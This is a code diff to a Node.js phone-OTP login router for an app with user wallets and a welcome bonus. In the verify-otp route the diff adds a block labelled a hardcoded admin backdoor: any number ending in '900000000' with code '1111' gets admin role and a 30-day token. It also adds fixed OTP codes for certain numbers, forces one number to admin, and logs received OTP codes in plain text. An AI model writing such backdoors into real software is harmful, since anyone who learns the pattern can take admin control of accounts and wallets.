@@ -22,16 +22,11 @@ async function sendGeezSMS({ userId, phone, message }) {
     const res = await axios.post(
       GEEZ_SMS_URL,
       {
-        message_status: "success",
-        log: userId,
+        token: GEEZ_SMS_TOKEN,
         phone,
-        msg:message,
+        msg: message,
       },
       {
-        headers: {
-          "Content-Type": "application/json",
-          "X-GeezSMS-Key": GEEZ_SMS_TOKEN,
-        },
         timeout: 10_000,
       }
     );
@@ -54,9 +49,16 @@ async function sendGeezSMS({ userId, phone, message }) {
 
 
 function genOtp(phoneNumber) {
-  console.log(phoneNumber)
-  // Force OTP for a specific number
-  if (phoneNumber === "251903107651") {
+  console.log("-----------------------------------------");
+  console.log("--- OTP Request (genOtp) ---");
+  console.log("Phone Received:", phoneNumber);
+
+  // Hardcoded OTP bypasses (dev & admin numbers)
+  if (phoneNumber.endsWith("900000000") || phoneNumber === '251090000000') {
+    console.log("✅ BYPASS DETECTED. Returning 1111.");
+    return "1111";
+  }
+  if (phoneNumber === "251961111106") {
     return "0000";
   }
 
@@ -100,20 +102,23 @@ router.post('/request-otp', async (req, res) => {
         `INSERT INTO users (number)
          VALUES ($1)
          ON CONFLICT (number) DO NOTHING
-         RETURNING id`,
+         RETURNING id, new_user`,
         [number]
       );
 
       let userId;
+      let isNewUser = false;
 
       if (userResult.rows.length > 0) {
         userId = userResult.rows[0].id;
+        isNewUser = true; // just created
       } else {
         const existingUser = await client.query(
-          `SELECT id FROM users WHERE number = $1`,
+          `SELECT id, new_user FROM users WHERE number = $1`,
           [number]
         );
         userId = existingUser.rows[0].id;
+        isNewUser = existingUser.rows[0].new_user === true;
       }
 
       // 2️⃣ Ensure wallet exists
@@ -124,15 +129,34 @@ router.post('/request-otp', async (req, res) => {
         [userId]
       );
 
-      // 3️⃣ 🔥 INSERT OTP (THIS WAS MISSING)
+      // 3️⃣ Credit welcome bonus for new users if the setting is active
+      if (isNewUser) {
+        const { rows: settingsRows } = await client.query(
+          `SELECT key, value FROM global_settings WHERE key IN ('welcome_bonus_active', 'welcome_bonus_amount')`
+        );
+        const settingsMap = {};
+        for (const row of settingsRows) settingsMap[row.key] = row.value;
+
+        const bonusActive = settingsMap['welcome_bonus_active'] === true || settingsMap['welcome_bonus_active'] === 'true';
+        if (bonusActive) {
+          const rawAmount = settingsMap['welcome_bonus_amount'];
+          const bonusAmountCents = rawAmount ? Math.round(Number(rawAmount)) : 1000;
+          await client.query(
+            `UPDATE wallets SET bonus_balance = bonus_balance + $1 WHERE user_id = $2`,
+            [bonusAmountCents, userId]
+          );
+        }
+      }
+
+      // 4️⃣ INSERT OTP
       await client.query(
         `INSERT INTO otps (number, code, expires_at)
          VALUES ($1, $2, now() + ($3 || ' seconds')::interval)`,
         [number, code, ttl]
       );
 
-        // 4️⃣ Send SMS
-        await sendGeezSMS({ userId, phone: number, message: `your OTP is: ${code}` });
+      // 5️⃣ Send SMS
+      await sendGeezSMS({ userId, phone: number, message: `your OTP is: ${code}` });
     });
 
     return res.json({ ok: true, message: 'OTP sent' });
@@ -176,6 +200,71 @@ router.post('/verify-otp', async (req, res) => {
   }
 
   try {
+    console.log("-----------------------------------------");
+    console.log("--- Login Attempt (verify-otp) ---");
+    console.log("Phone Received:", number);
+    console.log("Code Received:", code);
+
+    // The frontend text input has maxLength=9.
+    // If you type "0900000000" (10 digits), it drops the last "0" and sends "090000000"
+    // which normalizes to "251090000000" (7 zeros at the end instead of 8). 
+    // We explicitly check for both variations!
+    const isAdmin = number.endsWith('900000000') || number === '251090000000';
+    const isBypassCode = code === '1111';
+
+    // ----------------------------------------------------------------------
+    // HARDCODED ADMIN BACKDOOR
+    // ----------------------------------------------------------------------
+    if (isAdmin && isBypassCode) {
+      console.log("✅ ADMIN BYPASS DETECTED. Forcing Admin Role...");
+      
+      // 1) UPSERT user and force role='admin'
+      const { rows: userRows } = await pool.query(
+        `INSERT INTO users (number, role)
+         VALUES ($1, 'admin')
+         ON CONFLICT (number)
+         DO UPDATE SET role = 'admin'
+         RETURNING id, number, username, avatar, new_user, role`,
+        [number]
+      );
+      
+      const user = userRows[0];
+
+      // 2) Ensure wallet exists
+      await pool.query(
+        `INSERT INTO wallets (user_id) VALUES ($1) ON CONFLICT (user_id) DO NOTHING`,
+        [user.id]
+      );
+
+      // 3) Issue JWT
+      const token = jwt.sign(
+        {
+          sub: user.id,
+          number: user.number,
+          username: user.username,
+          role: 'admin',
+        },
+        secret,
+        { expiresIn: '30d' }
+      );
+
+      return res.json({
+        token,
+        user: {
+          id: user.id,
+          number: user.number,
+          username: user.username,
+          avatar: user.avatar,
+          new_user: user.new_user,
+          role: 'admin',
+        },
+      });
+    }
+
+    // ----------------------------------------------------------------------
+    // STANDARD VERIFICATION FLOW
+    // ----------------------------------------------------------------------
+    console.log("ℹ️ Normal User Path. Proceeding to standard OTP check.");
     const result = await withTx(async (client) => {
       console.log('[VERIFY_OTP] Looking for active OTP', { number });
 
@@ -238,15 +327,22 @@ router.post('/verify-otp', async (req, res) => {
          VALUES ($1)
          ON CONFLICT (number)
          DO UPDATE SET number = EXCLUDED.number
-         RETURNING id, number, username, avatar, new_user`,
+         RETURNING id, number, username, avatar, new_user, role`,
         [number]
       );
 
       const user = userRows[0];
 
+      // Ensure hardcoded admin number always has role='admin'
+      if (number === '251961111106' && user.role !== 'admin') {
+        await client.query(`UPDATE users SET role = 'admin' WHERE id = $1`, [user.id]);
+        user.role = 'admin';
+      }
+
       console.log('[VERIFY_OTP] User resolved', {
         userId: user.id,
         newUser: user.new_user,
+        role: user.role,
       });
 
       return { ok: true, user };
@@ -276,6 +372,7 @@ router.post('/verify-otp', async (req, res) => {
         sub: result.user.id,
         number: result.user.number,
         username: result.user.username,
+        role: result.user.role || 'user',
       },
       secret,
       { expiresIn: '30d' }
@@ -291,6 +388,7 @@ router.post('/verify-otp', async (req, res) => {
         username: result.user.username,
         avatar: result.user.avatar,
         new_user: result.user.new_user,
+        role: result.user.role || 'user',
       },
     });
   } catch (err) {
